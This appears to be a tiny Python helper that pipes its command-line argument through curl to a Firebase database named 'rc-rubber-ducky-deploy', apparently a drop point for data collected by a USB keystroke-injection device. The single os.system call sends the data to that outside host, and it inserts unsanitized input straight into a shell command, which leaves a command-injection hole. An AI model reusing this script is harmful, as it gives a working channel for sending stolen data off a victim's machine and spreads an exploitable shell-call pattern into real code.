import sys
import os

def main():
    os.system(f"curl -X PUT -d '\"{sys.argv[1]}\"' https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app/users/011935/out.json")

if __name__ == "__main__":
    main()
